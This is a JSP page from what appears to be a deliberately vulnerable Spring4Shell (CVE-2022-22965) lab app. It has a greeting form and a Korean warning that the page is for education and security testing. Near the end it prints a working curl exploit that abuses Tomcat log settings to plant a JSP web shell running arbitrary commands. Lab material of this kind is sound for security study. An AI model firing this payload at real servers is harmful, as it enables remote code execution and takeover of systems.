<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Spring4Shell Vulnerable Page - Greeting</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
            color: #856404;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            <strong>⚠️ 경고:</strong> 이 페이지는 Spring4Shell (CVE-2022-22965) 취약점 테스트를 위한 것입니다.
            교육 및 보안 테스트 목적으로만 사용하세요.
        </div>

        <h1>Greeting Form</h1>
        <p>아래 폼에 이름과 메시지를 입력하세요.</p>

        <form:form method="POST" modelAttribute="greeting">
            <div class="form-group">
                <label for="name">Name:</label>
                <form:input path="name" id="name" />
            </div>

            <div class="form-group">
                <label for="message">Message:</label>
                <form:input path="message" id="message" />
            </div>

            <button type="submit">Submit</button>
        </form:form>

        <hr style="margin: 30px 0;">

        <h3>Spring4Shell 공격 테스트 방법</h3>
        <p>다음 curl 명령을 사용하여 취약점을 테스트할 수 있습니다:</p>
        <pre style="background-color: #f5f5f5; padding: 15px; overflow-x: auto; border-radius: 4px;">
curl "http://localhost:8080/spring4shell-test-1.0/greeting?\
class.module.classLoader.resources.context.parent.pipeline.first.pattern=\
%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20\
java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().\
exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20\
byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20\
out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&\
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&\
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&\
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&\
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        </pre>
    </div>
</body>
</html>
